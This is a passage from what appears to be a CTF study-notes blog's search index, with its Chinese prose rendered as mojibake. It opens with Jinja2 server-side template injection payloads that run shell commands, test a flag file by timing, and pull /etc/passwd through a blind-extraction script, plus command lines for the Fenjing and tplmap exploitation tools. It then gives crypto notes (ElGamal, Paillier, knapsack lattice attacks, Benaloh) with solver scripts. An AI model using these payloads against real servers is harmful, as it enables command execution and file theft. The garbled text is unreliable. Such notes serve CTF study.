chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;&#123;% set space=chcr(three*three*five-five-five-three) %&#125;&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125; æ— å›æ˜¾ 12345&#123;&#123;yyy.__init__.__globals__.__builtins__|attr(&#x27;__getitem_&#x27;)(&#x27;eval&#x27;)(&#x27;__import__(&quot;time&quot;).sleep(3) if open(&quot;/app/flag.txt&quot;).read()[0]==&quot;f&quot; else 1&#x27;)&#125;&#125;&#123;%if session.update(&#123;&#x27;f&#x27;:lipsum.__globals__.__os__.__popen__(&#x27;id&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&#123;%include session.update(&#123;&#x27;f&#x27;:lipsum.__globals__.__os__.__popen__(&#x27;id&#x27;).read()&#125;)%&#125; ç›²æ³¨ï¼š 123456789101112131415161718import requestsfrom string import printable as pthost = &#x27;&#x27;res = &#x27;&#x27;for i in range(0,40): for c in pt: payload = &#x27;&#123;&#123;(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__[&quot;__builtins__&quot;][&quot;file&quot;](&quot;/etc/passwd&quot;).read()|string).index(&quot;%c&quot;,%d,%d)&#125;&#125;&#x27; % (c,i,i+1) param = &#123; &quot;name&quot;:payload &#125; req = requests.get(host,params=param) if req.status_code == 200: res += c break print(res) â€‹ è‡ªåŠ¨åŒ–å·¥å…·Fenjing https://github.com/Marven11/Fenjing python -m fenjing crack --method GET --inputs name --url &#39;http://xxx/&#39; tplmap https://github.com/epinna/tplmap /tplmap.py --os-cmd -u &#39;http://www.target.com/page?name=John&#39; å‚è€ƒæ–‡SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰ SSTIæ¼æ´å­¦ä¹  (ä¸Š)â€”â€”åŸºç¡€çŸ¥è¯†å’Œä¸€äº›ä¸å¸¸è§çš„æ¨¡æ¿å¼•æ“ä»‹ç» â€‹ Pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰ â€‹ Payloadå‚è€ƒServer Side Template Injection SSTI (Server Side Template Injection)","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"SSTI","slug":"SSTI","permalink":"https://lazzzaro.github.io/tags/SSTI/"}],"author":"Lazzaro"},{"title":"å…¶ä»–åŠ å¯†ç®—æ³•","slug":"crypto-å…¶ä»–åŠ å¯†ç®—æ³•","date":"2020-05-13T12:21:19.000Z","updated":"2022-12-15T16:56:34.646Z","comments":true,"path":"2020/05/13/crypto-å…¶ä»–åŠ å¯†ç®—æ³•/","permalink":"https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/","excerpt":"","text":"â€‹ GMï¼ˆGoldwasser-Micaliï¼‰åŒæ€åŠ å¯†Goldwasser-Micali (GM) åŠ å¯†æ–¹æ¡ˆæ˜¯ç¬¬ä¸€ä¸ªè¯æ˜ä¸º CPA å®‰å…¨çš„å…¬é’¥åŠ å¯†æ–¹æ¡ˆï¼Œå…¶å®‰å…¨æ€§ä¾èµ–äºä»åˆæ•°æ¨¡çš„äºŒæ¬¡éå‰©ä½™ä¸­åŒºåˆ†äºŒæ¬¡å‰©ä½™å›°éš¾æ€§å‡è®¾ã€‚ å¯†é’¥ç”Ÿæˆ ç”¨æˆ·éšæœºç”Ÿæˆä¸¤ä¸ªå¤§ç´ æ•° $p$ å’Œ $q$ï¼Œè®¡ç®— $n=pq$ï¼Œ$z$ æ˜¯æ¨¡ $n$ çš„äºŒæ¬¡éå‰©ä½™ä¸­çš„éšæœºæ•°ã€‚ç³»ç»Ÿå…¬é’¥ $pk=(n,z)$ï¼Œç³»ç»Ÿç§é’¥ $sk=(p,q)$ã€‚ åŠ å¯† æ˜æ–‡ç©ºé—´æ˜¯ $\\{0,1\\}$ï¼Œå¯¹äºæ˜æ–‡ $x\\in\\{0,1\\}$ï¼ŒåŠ å¯†æ–¹é€‰å–ç§˜å¯†éšæœºæ•° $r\\in Z_n^{*}$ï¼Œåˆ©ç”¨ç³»ç»Ÿå…¬é’¥ $pk$ è®¡ç®—å¯†æ–‡$E(x)=r^2z^x\\bmod n$ã€‚ è§£å¯† å¯¹äºå¯†æ–‡ $E(x)$ï¼Œåˆ¤æ–­ $E(x)$ æ˜¯å¦ä¸ºæ¨¡ $n$ çš„äºŒæ¬¡å‰©ä½™ï¼Œè‹¥ $E(x)$ æ˜¯æ¨¡ $n$ çš„äºŒæ¬¡å‰©ä½™ï¼Œåˆ™æ˜æ–‡ $D(E(x))=0$ï¼› è‹¥ $E(x)$ ä¸æ˜¯æ¨¡ $n$ çš„äºŒæ¬¡å‰©ä½™ï¼Œåˆ™ $D(E(x))=1$ã€‚ GMåŠ å¯†ç³»ç»Ÿçš„å®‰å…¨æ€§æ˜¯åŸºäºæ¨¡ $n$ çš„äºŒæ¬¡å‰©ä½™é—®é¢˜ã€‚å¯¹äºç§é’¥çš„æ‹¥æœ‰è€…ï¼ŒçŸ¥é“å¤§æ•´æ•° $n$ çš„å› å­åˆ†è§£ï¼Œæ±‚è§£æ¨¡ $n$ çš„äºŒæ¬¡å‰©ä½™é—®é¢˜æ˜¯å®¹æ˜“çš„ï¼›è€Œå¯¹äºæ”»å‡»è€…ï¼Œæ— æ³•è·çŸ¥ $n$ çš„å› å­åˆ†è§£ï¼Œæ±‚è§£æ¨¡ $n$ çš„äºŒæ¬¡å‰©ä½™é—®é¢˜æ˜¯å›°éš¾çš„ï¼Œç»§è€Œä¿è¯äº†è¯¥åŠ å¯†æ–¹æ¡ˆçš„å®‰å…¨æ€§ã€‚ 123456789101112from Crypto.Util.number import long_to_bytesimport gmpy2plaintext = &#x27;&#x27;with open(&#x27;output.txt&#x27;) as f: n = int(f.readline()) for line in f: cipher = int(line) if gmpy2.jacobi(cipher,n) == -1: plaintext += &#x27;1&#x27; else: plaintext += &#x27;0&#x27; print(long_to_bytes(int(plaintext,2))) â€‹ ElGamalåŠ å¯†ElGamalåŠ å¯†ç®—æ³•æ˜¯ä¸€ä¸ªåŸºäºè¿ªè²-èµ«å°”æ›¼å¯†é’¥äº¤æ¢çš„éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚å®ƒåœ¨1985å¹´ç”±å¡”å¸Œå°”Â·ç›–è«å°”æå‡ºã€‚GnuPGå’ŒPGPç­‰å¾ˆå¤šå¯†ç å­¦ç³»ç»Ÿä¸­éƒ½åº”ç”¨åˆ°äº†ElGamalç®—æ³•ã€‚ElGamalåŠ å¯†ç®—æ³•å¯ä»¥å®šä¹‰åœ¨ä»»ä½•å¾ªç¯ç¾¤Gä¸Šã€‚å®ƒçš„å®‰å…¨æ€§å–å†³äºGä¸Šçš„ç¦»æ•£å¯¹æ•°éš¾é¢˜ã€‚ å¯†é’¥ç”Ÿæˆ éšæœºé€‰æ‹©ä¸€ä¸ªæ»¡è¶³å®‰å…¨è¦æ±‚çš„å¤§ç´ æ•° $p$ï¼Œå¹¶ç”Ÿæˆæœ‰é™åŸŸ $Z_{p}$ã€‚çš„ä¸€ä¸ªç”Ÿæˆå…ƒ $g\\in Z_{p}^{*}$ï¼› é€‰ä¸€ä¸ªéšæœºæ•° $x\\;(1&lt;x&lt;p-1)$ï¼Œè®¡ç®— $y\\equiv g^{x} \\pmod p$ï¼Œåˆ™å…¬é’¥ä¸º $(y,g,p)$ï¼Œç§é’¥ä¸º $x$ã€‚ åŠ å¯† ä¸RSAå¯†ç ä½“åˆ¶ç›¸åŒï¼ŒåŠ å¯†æ—¶é¦–å…ˆå°†æ˜æ–‡æ¯”ç‰¹ä¸²åˆ†ç»„ï¼Œä½¿å¾—æ¯ä¸ªåˆ†ç»„å¯¹åº”çš„åè¿›åˆ¶æ•°å°äº$p$ï¼Œå³åˆ†ç»„é•¿åº¦å°äº$\\log_2p$ï¼Œç„¶åå¯¹æ¯ä¸ªæ˜æ–‡åˆ†ç»„åˆ†åˆ«åŠ å¯†ã€‚å…·ä½“è¿‡ç¨‹åˆ†ä¸ºå¦‚ä¸‹å‡ æ­¥ï¼š å¾—åˆ°æ¥æ”¶æ–¹çš„å…¬é’¥ $(y,g,p)$ï¼› æŠŠæ¶ˆæ¯ $m$ åˆ†ç»„ä¸ºé•¿åº¦ä¸º $L\\;(L&lt;\\log_2 p)$ çš„æ¶ˆæ¯åˆ†ç»„ $m=m_1m_2\\dots m_t$ï¼› å¯¹ç¬¬ $i$ å—æ¶ˆæ¯ $(1\\leq i\\leq t)$ éšæœºé€‰æ‹©æ•´æ•° $r_i\\;(1&lt;r_i&lt;p-1)$ï¼› è®¡ç®— $c_i\\equiv g^{r_i}\\pmod p,\\;c_i^\\prime\\equiv m_iy^{r_i} \\pmod p\\;(1\\leq i\\leq t)$ï¼› å°†å¯†æ–‡ $C=(c_1,c_1^\\prime)(c_2,c_2^\\prime)\\dots(c_t,c_t^\\prime)$ å‘é€ç»™æ¥æ”¶æ–¹ã€‚ è§£å¯† æ¥æ”¶æ–¹æ”¶åˆ°çš„å¯†æ–‡ $C=(c_1,c_1^\\prime)(c_2,c_2^\\prime)\\dots(c_t,c_t^\\prime)$ï¼› ä½¿ç”¨ç§é’¥ $x$ å’Œè§£å¯†ç®—æ³• $m_i \\equiv ({c_i^\\prime}({c_i^x})^{-1}) \\pmod p \\; (1\\leq i\\leq t)$ è¿›è¡Œè®¡ç®—ï¼› å¾—åˆ°æ˜æ–‡ $m=m_1m_2\\dots m_t$ã€‚ ElGamalåŠ å¯†è¿‡ç¨‹éœ€è¦ä¸¤æ¬¡æ¨¡æŒ‡æ•°è¿ç®—å’Œä¸€æ¬¡æ¨¡ä¹˜ç§¯è¿ç®—ï¼Œè§£å¯†è¿‡ç¨‹éœ€è¦æ¨¡æŒ‡æ•°è¿ç®—ï¼Œæ±‚é€†è¿ç®—å’Œæ¨¡ä¹˜ç§¯è¿ç®—å„ä¸€æ¬¡ã€‚æ¯æ¬¡åŠ å¯†è¿ç®—éœ€è¦é€‰æ‹©ä¸€ä¸ªéšæœºæ•°ï¼Œæ‰€ä»¥å¯†æ–‡æ—¢ä¾èµ–äºæ˜æ–‡ï¼Œåˆä¾èµ–äºé€‰æ‹©çš„éšæœºæ•°ï¼Œæ•…å¯¹äºåŒä¸€ä¸ªæ˜æ–‡ï¼Œä¸åŒçš„æ—¶åˆ»ç”Ÿæˆçš„å¯†æ–‡ä¸åŒã€‚å¦å¤–ï¼ŒElGamalåŠ å¯†ä½¿å¾—æ¶ˆæ¯æ‰©å±•äº†ä¸¤å€ï¼Œå³å¯†æ–‡çš„é•¿åº¦æ˜¯å¯¹åº”æ˜æ–‡é•¿åº¦çš„ä¸¤å€ã€‚ â€‹ PaillieråŒæ€åŠ å¯†Paillierå¯†ç ï¼Œäº1999å¹´ç”±Pascal Paillierå‘æ˜ï¼Œæ˜¯ä¸€ç§ç”¨äºå…¬é’¥åŠ å¯†çš„æ¦‚ç‡éå¯¹ç§°ç®—æ³•ã€‚è¯¥ç®—æ³•å…·æœ‰åŠ æ³•åŒæ€çš„æ€§è´¨ï¼›è¿™æ„å‘³ç€ï¼Œä»…ç»™å‡ºå…¬é’¥å’Œ $m_1,m_2$ åŠ å¯†ï¼Œå¯ä»¥è®¡ç®—å‡º $m_1 + m_2$ ã€‚ å¯†é’¥ç”Ÿæˆ éšæœºé€‰æ‹©ä¸¤ä¸ªå¤§è´¨æ•° $p,q$ æ»¡è¶³ $\\gcd(pq,(p-1)(q-1))=1$ã€‚æ­¤å±æ€§ä¿è¯ä¸¤ä¸ªè´¨æ•°é•¿åº¦ç›¸ç­‰ï¼› è®¡ç®— $n=pq$ å’Œ $\\lambda=\\text{lcm}(p-1,q-1)$ï¼› é€‰æ‹©éšæœºæ•´æ•° $g(g\\in \\mathbb{Z}_{n^2}^{*}) $ï¼Œä½¿å¾—æ»¡è¶³ $n$ æ•´é™¤ $g$ çš„é˜¶ï¼ˆ$0\\lt g \\lt n^2$ï¼‰ï¼› å®šä¹‰ $L(x)=\\cfrac{x-1}{n}$ï¼› è®¡ç®— $\\mu=(L(g^\\lambda \\bmod n^2))^{-1} \\bmod n$ï¼› å…¬é’¥ä¸º $(n,g)$ï¼Œç§é’¥ä¸º $(\\lambda,\\mu)$ã€‚ ç®€åŒ–ç‰ˆ $g=n+1$ $\\lambda=\\varphi(n)=(p-1)(q-1)$ $\\mu=\\varphi(n)^{-1}\\bmod n$ åŠ å¯† $m$ ä¸ºåŸæ–‡ï¼ˆ$0\\leq m \\lt n$ï¼‰ï¼› é€‰æ‹©éšæœºæ•° $r(0 \\lt r \\lt n,r \\in \\mathbb{Z}_{n^2}^{*})$ï¼Œä¸” $\\gcd(r,n)=1$ï¼› åŠ å¯†ï¼š$c=g^m \\cdot r^n\\bmod n^2$ã€‚ è§£å¯† è§£å¯†ï¼š$m=L(c^\\lambda \\bmod n^2)\\cdot \\mu \\bmod n$ã€‚ æ€§è´¨ $D(E(m_1,r_1) \\cdot E(m_2,r_2) \\bmod {n^2})=m_1+m_2 \\bmod n$ $D(E(m_1,r_1) \\cdot g^{m_2} \\bmod {n^2})=m_1+m_2 \\bmod n$ $D(E(m_1,r_1)^{m_2} \\bmod {n^2})=m_1m_2 \\bmod n$ $D(E(m_2,r_2)^{m_1} \\bmod {n^2})=m_1m_2 \\bmod n$ $D(E(m,r)^{k} \\bmod {n^2})=km \\bmod n$ $D(E(m,r) \\cdot (1+n)^k \\bmod {n^2})=m+k \\bmod n$ â€‹ Merkle-HellmanèƒŒåŒ…åŠ å¯†ï¼ˆKnapsackï¼‰1977å¹´ï¼ŒMerkleä¸Hellmanåˆä½œè®¾è®¡äº†ä½¿ç”¨èƒŒåŒ…ç®—æ³•ï¼Œè¯¥ç®—æ³•æå‡ºåå¯†ç å­¦ç•Œæå‡ºäº†å¾ˆå¤šèƒŒåŒ…å‹åŠ å¯†ç®—æ³•ã€‚ å…¶å·¥ä½œåŸç†æ˜¯ï¼šå‡å®šç”²æƒ³åŠ å¯†ï¼Œåˆ™å…ˆäº§ç”Ÿä¸€ä¸ªè¾ƒæ˜“æ±‚è§£çš„èƒŒåŒ…é—®é¢˜ï¼Œå¹¶ç”¨å®ƒçš„è§£ä½œä¸ºä¸“ç”¨å¯†é’¥ï¼›ç„¶åä»è¿™ä¸ªé—®é¢˜å‡ºå‘ï¼Œç”Ÿæˆå¦ä¸€ä¸ªéš¾è§£çš„èƒŒåŒ…é—®é¢˜ï¼Œå¹¶ä½œä¸ºå…¬å…±å¯†é’¥ã€‚å¦‚æœä¹™æƒ³å‘ç”²å‘é€æŠ¥æ–‡ï¼Œä¹™å°±å¯ä»¥ä½¿ç”¨éš¾è§£çš„èƒŒåŒ…é—®é¢˜å¯¹æŠ¥æ–‡è¿›è¡ŒåŠ å¯†ï¼Œç”±äºè¿™ä¸ªé—®é¢˜ååˆ†éš¾è§£ï¼Œæ‰€ä»¥ä¸€èˆ¬æ²¡æœ‰äººèƒ½å¤Ÿç ´è¯‘å¯†æ–‡ï¼›ç”²æ”¶åˆ°å¯†æ–‡åï¼Œå¯ä»¥ä½¿ç”¨æ˜“è§£çš„ä¸“ç”¨å¯†é’¥è§£å¯†ã€‚ ä½†æ˜¯ï¼Œåœ¨å®ƒå‘è¡¨å‡ å¹´åï¼Œå°±æ‰¾åˆ°äº†æ”»ç ´å®ƒçš„æ–¹æ³•ã€‚å³ä½¿å¦‚æ­¤ï¼Œå®ƒä»ç„¶ä»£è¡¨ç€ä¸€ç±»å¾ˆéš¾é—®é¢˜çš„ç®—æ³•ã€‚ åŠ å¯† é€‰æ‹©ä»»ä½•ä¸€ä¸ªè¶…é€’å¢é›† $\\{s_1,s_2,â€¦,s_n\\}$ã€‚ é™·é—¨ç”±ä»»æ„å¤§äº $\\sum_{i}s_i$ çš„ç´ æ•° $p$ å’Œä»»æ„å°äº $p$ çš„æ•´æ•° $p$ ç»„æˆï¼Œè¿™ä¸¤ä¸ªæ•°å’Œé›†åˆ $\\{s_1,s_2,â€¦,s_n\\}$ éƒ½æ˜¯ä¿å¯†çš„ã€‚ å…¬å¼€çš„æ•´æ•°é›†æ˜¯ $\\{t_1,t_2,â€¦,t_n\\}$ ï¼Œå…¶ä¸­ $t_i=a_i \\cdot s_i \\pmod p$ã€‚ äºŒè¿›åˆ¶æ˜æ–‡ $(b_1,b_2,â€¦,b_n)$ çš„åŠ å¯†æ“ä½œä¸º $y=\\sum_{i}b_it_i$ï¼Œæ•´æ•° $y$ æ˜¯å¯†æ–‡ã€‚ è§£å¯† æ‰¾åˆ° $a^{-1} \\pmod p$ã€‚å› ä¸º $p$ æ˜¯è´¨æ•°ï¼Œ $a^{-1} \\pmod p$ ä¸€å®šå­˜åœ¨ã€‚è®¡ç®— $a^{-1}y \\pmod p$ã€‚ å¾—åˆ° $a^{-1}y \\pmod p$ è¿™ä½¿å¾—ï¼š $a^{-1}y=a^{-1}\\sum_{i}b_it_i \\pmod p=\\sum_{i}b_i(a^{-1}as_i) \\pmod p=\\sum_{i}b_is_i$ å› ä¸ºé›†åˆ $\\{s_1,s_2,â€¦,s_n\\}$æ˜¯è¶…é€’å¢é›†ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å®šä½æ˜æ–‡ä½ã€‚ â˜…æ³¨ï¼š Knapsackç³»ç»Ÿçš„å¯†åº¦ä¸ºï¼š $d = \\cfrac{n}{\\log_2(max\\{a_i\\})}$ åŸºäºå­é›†å’Œé—®é¢˜ï¼ŒMHå¯†ç ç³»ç»Ÿæ˜¯æœ€å¼€å§‹å‡ºç°çš„ä¸€ç§å¯†åº¦æ¯”è¾ƒä½çš„Knapsackå¯†ç ç³»ç»Ÿã€‚å¾ˆå¿«Shamirç­‰äººæå‡ºäº†ä¸€ç³»åˆ—çš„æ”»å‡»æ–¹å¼ï¼ŒåŒ…æ‹¬ä¸¢ç•ªå›¾é€¼è¿‘ï¼ŒLLLç­‰æ–¹æ³•ï¼ˆ$d&lt;0.9408$ï¼‰ã€‚è™½ç„¶è¿™ä¸ªå¯†ç ç³»ç»Ÿè¢«æ”»ç ´äº†ï¼Œæ–°çš„Knapsackç³»ç»Ÿè¯ç”Ÿäº†ï¼Œè¿™ç§å¯†ç ç³»ç»Ÿçš„å¯†åº¦å˜é«˜äº†ï¼Œ$a_i$ å€¼å˜å°äº†ï¼Œè€Œä¸”åŠ å¯†çš„æ˜æ–‡çš„äºŒè¿›åˆ¶ä½ä¸­1çš„æ•°é‡ä¹Ÿå¾ˆå°ã€‚ æ–°çš„å¯†ç ç³»ç»Ÿæ›´åŠ éš¾ä»¥ç ´è§£ï¼Œä¹Ÿç§°ä¹‹ä¸ºHardKnapsackç³»ç»Ÿï¼Œä¸è¿‡åæ¥å¯†ç å­¦å®¶ä»¬è¿˜æ˜¯å‘ç°äº†æ”»å‡»æ–¹æ³•ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºlow-weight attackã€‚ Schroeppel-Shamir Algorithm æ—¶é—´å¤æ‚åº¦,ç©ºé—´å¤æ‚åº¦å‡ä¸º $O(\\cfrac{n}{2})$ The Howgrave-Grahamâ€“Joux Algorithm æ—¶é—´å¤æ‚åº¦ $O(0.337n)$ï¼Œç©ºé—´å¤æ‚åº¦ $O(0.256n)$ æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸¤ç§ç®—æ³•æ˜¯åŸºäºåˆ†æ²»å’Œmitmçš„æ€æƒ³è¿›è¡Œæ”»å‡»çš„ã€‚ Lagarias and Odlyzkoâ€™s Method / CJLOSS Method å‚è€ƒï¼šLattice Reduction Attack on the Knapsack Type Cryptosystem æ„é€ æ ¼ï¼š $\\left(\\begin {array}{c} b_0 \\newline b_1 \\newline \\vdots \\newline b_n \\newline b_{n+1} \\end{array} \\right) =\\left(\\begin {array}{c} 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_0 \\newline 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; Nk_1 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; Nk_n \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_{n+1} \\end{array} \\right) $ 12345678910111213141516M = Matrix.identity(n)last_row = [0 for x in keys]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)ct = last_col = keys[:]last_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.LLL()target = X[0][:-1]ans = [-k for k in target] å¯¹äºå¯†åº¦æ¯”è¾ƒé«˜çš„Knapsackå¯†ç ç³»ç»Ÿï¼Œåœ¨1çš„æ•°é‡ç¡®å®šæƒ…å†µä¸‹ï¼Œå¯ä»¥å°è¯•åˆ†æ®µçˆ†ç ´ã€‚ å‚è€ƒè®ºæ–‡ï¼šImproved Generic Algorithms for Hard Knapsacks å¸¸è§„è§£å¯†è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940from sage.all import *pk = # public keyct = # ciphertextprint(ct)print(len(pk))n = len(pk)# Sanity check for application of low density attackd = n / log(max(pk), 2)print(CDF(d))assert CDF(d) &lt; 0.9408M = Matrix.identity(n) * 2last_row = [1 for x in pk]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)last_col = pklast_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.BKZ()sol = []for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) breaks = solprint(s) æ³„éœ²éƒ¨åˆ†æ˜æ–‡ç©ºé—´çš„é™ç»´å¤„ç† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758###Sagepubkey = [...] c = #å‰ç¼€ flag&#123;prefix = [int(_) for _ in bin(bytes_to_long(b&#x27;flag&#123;&#x27;))[2:]]for i in range(len(prefix)): c -= prefix[i] * pubkey[i]#åç¼€ &#125;suffix = [int(_) for _ in bin(ord(&#x27;&#125;&#x27;))[2:].rjust(8, &#x27;0&#x27;)]n = len(pubkey)for i in range(8): c -= pubkey[n - 8 + i] * suffix[i]#ä¸­éƒ¨md5èŒƒå›´ 0-felements = []for i in range(len(prefix), len(pubkey) - 8, 8): elements.append(pubkey[i + 1]) c -= 1 * pubkey[i + 2] for j in range(3, 8): elements.append(pubkey[i + j]) n = len(elements)A = Matrix(ZZ, n + 1, n + 1)for i in range(n): A[i, 0] = elements[i] A[i, i + 1] = 2A[n, 0] = cfor i in range(1, n + 1): A[n, i] = 1AL = A.BKZ()mid = Nonefor line in AL: if all(line[i] == 1 or line[i] == -1 for i in range(1, n + 1)): if line[1] == 1: line = -line mid = line[1:] breakmid_str = &#x27;&#x27;for _ in mid: if _ == -1: mid_str += &#x27;0&#x27; else: mid_str += &#x27;1&#x27;flag = &#x27;&#x27;j = 0for i in range(32): flag += &#x27;0&#x27; flag += mid_str[j] j += 1 flag += &#x27;1&#x27; for k in range(5): flag += mid_str[j] j += 1print(bytes.fromhex(hex(int(flag, 2))[2:])) å­é›†åˆé—®é¢˜ è½¬åŒ–ä¸º æ±‚è§£SVP/CVP+Lattice Reduction Algorithm å‚è€ƒï¼š WMCTF 2020 - babySum + Sum Crypto Research: Solving Subset Sum Problem by Lattice Reduction 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import reimport randomimport multiprocessing as mpfrom functools import partialdef check(sol, A, s): &quot;&quot;&quot;Check whether *sol* is a solution to the subset-sum problem. &quot;&quot;&quot; return sum(x*a for x, a in zip(sol, A)) == s def solve(A, n, k, s, ID=None, BS=22): N = ceil(sqrt(n)) # parameter used in the construction of lattice rand = random.Random(x=ID) # seed # 1. Construct the lattice # (n+1) * (n+2) # 1 0 ... 0 a_0*N N # 0 1 ... 0 a_1*N N # . . ... . ... . # 0 0 ... 1 a_n*N N # 0 0 ... 0 s*N k*N lat = [] for i, a in enumerate(A): lat.append([1*(j == i) for j in range(n)] + [N*a] + [N]) lat.append([0]*n + [N*s] + [k*N]) # main loop itr = 0 start_time = cputime() while True: itr += 1 # 2. Randomly shuffle l = lat[::] shuffle(l, random=rand.random) # 3. BKZ!!! m = matrix(ZZ, l) t_BKZ = cputime() m_BKZ = m.BKZ(block_size=BS) print(f&quot;n=&#123;n&#125; &#123;itr&#125; runs. BKZ running time: &#123;cputime(t_BKZ):.3f&#125;s&quot;) # 4. Check the result for i, row in enumerate(m_BKZ): if check(row, A, s): if row.norm()^2 == k: print(f&quot;n=&#123;n&#125; After &#123;itr&#125; runs. FIND SVP!!! &#123;row&#125;\\n&quot; f&quot;Single core time used: &#123;cputime(start_time):.3f&#125;s&quot;) return Trues = A = []#choose k numbers from nk = n = solve_n = partial(solve, A, n, k, s)CPU_CORE_NUM = 8with mp.Pool(CPU_CORE_NUM) as pool: reslist = pool.imap_unordered(solve_n, range(CPU_CORE_NUM)) # terminate all processes once one process returns for res in reslist: if res: pool.terminate() break â€‹ BenalohåŠ å¯† å¯†é’¥ç”Ÿæˆ å‡å®šå—å¤§å°ä¸º $r$ï¼Œæ¯ä¸ªæ˜æ–‡ä¿¡æ¯å—å¤§å°åœ¨ $[0,r)$ èŒƒå›´å†…ã€‚ é€‰æ‹©ä¸¤ä¸ªå¤§è´¨æ•° $p=rpâ€™+1$ å’Œ $q$ ï¼Œæ»¡è¶³ $\\gcd(pâ€™,r)=\\gcd(q-1,r)=1$ï¼› è®¡ç®— $n=pq$ åŠ $\\varphi(n)=(p-1)(q-1)$ï¼› é€‰æ‹© $0 \\leq y \\lt n$ï¼Œæ»¡è¶³ $y^{\\varphi(n)/r} \\not\\equiv 1 \\pmod n$ï¼› è®¡ç®— $x=y^{\\varphi(n)/r} \\bmod n$ï¼Œå…¬é’¥ä¸º $(y,n)$ï¼Œç§é’¥ä¸º $(\\varphi,x)$ã€‚ åŠ å¯† å‡è®¾è¦åŠ å¯†çš„ä¿¡æ¯ $m \\in [0,r)$ï¼š é€‰æ‹©ä¸€ä¸ªæ•° $u \\in [0,n)$ï¼› è®¡ç®— $c=y^mu^r \\bmod n$ å³ä¸º $m$ çš„å¯†æ–‡ã€‚ è§£å¯† å‡è®¾è¦è§£å¯†çš„ä¿¡æ¯ $c$ï¼š è®¡ç®— $a=c^{\\varphi(n)/r} \\bmod n$ï¼› DLPæ±‚è§£æ»¡è¶³ $x^m \\equiv a \\pmod n$ çš„ $m$ï¼Œå³ $m=\\log_x(a)$ã€‚ å‚è€ƒ https://mystiz.hk/posts/2021-02-15-dicectf-1/ 123456789101112131415161718192021222324252627282930from Crypto.Util.number import long_to_bytesfrom tqdm import tqdmn = y = e = C = []p = q = phi = (p-1) * (q-1)tmp = phi // ebounds = (1, e)F = IntegerModRing(n)result = []x = F(pow(y, tmp, n))for c in tqdm(C): a = F(pow(c, tmp, n)) result.append(bsgs(x, a, bounds))flag = 0for i in result[::-1]: flag = flag*e + iflag = long_to_bytes(flag)print(flag) â€‹ LUC-RSAåŠ å¯† Lucasæ•°åˆ—ï¼ˆå¢å¡æ–¯æ•°åˆ—ï¼‰ é€’æ¨å…³ç³» ç»™å®šä¸¤ä¸ªæ•´æ•° $P$ å’Œ $Q$ï¼Œæ»¡è¶³ï¼š$P^2-4Q \\ne 0$ï¼Œ ç¬¬ä¸€ç±»å¢å¡æ–¯æ•°åˆ— $U_n(P,Q)$ å®šä¹‰ï¼š $U_0(P,Q)=0 \\\\ U_1(P,Q)=1 \\\\ U_n(P,Q)=P \\cdot U_{n-1}(P,Q) - Q \\cdot U_{n-2}(P,Q), n&gt;1$ ç¬¬äºŒç±»å¢å¡æ–¯æ•°åˆ— $V_n(P,Q)$ å®šä¹‰ï¼š $V_0(P,Q)=2 \\\\ V_1(P,Q)=P \\\\ V_n(P,Q)=P \\cdot V_{n-1}(P,Q) - Q \\cdot V_{n-2}(P,Q), n&gt;1$ ä»£æ•°å…³ç³» ç‰¹å¾æ–¹ç¨‹ï¼š$x^2-Px+Q=0$ï¼Œåˆ¤åˆ«å¼ï¼š$D=P^2-4Q$ï¼Œæ ¹ï¼š$a=\\cfrac{P+\\sqrt{D}}{2},b=\\cfrac{P-\\sqrt{D}}{2}$ã€‚ å¢å¡æ–¯æ•°åˆ—çš„é¡¹å¯ç”¨ $a$ å’Œ $b$ çš„é¡¹å®šä¹‰ï¼š $U_n = \\cfrac{a^n-b^n}{a-b} = \\cfrac{a^n-b^n}{\\sqrt{D}}$ $V_n = a^n + b^n$ å¯†é’¥ç”Ÿæˆ è®¾ $p,q$ æ˜¯ä¸¤ä¸ªå¥‡ç´ æ•°ï¼Œ$N=pq$ã€‚ $e \\in \\mathbb{Z}_N$ï¼Œä¸” $\\gcd(e,(p-1)(p+1)(q-1)(q-1))=1$ã€‚ å¢å¡æ–¯æ•°åˆ— $V_n(M,1) = M \\cdot V_{n-1} - V_{n-2}$ï¼Œå³ $P=M,Q=1$ã€‚ï¼ˆæ›´ä¸€èˆ¬æƒ…å†µè§paperï¼‰ 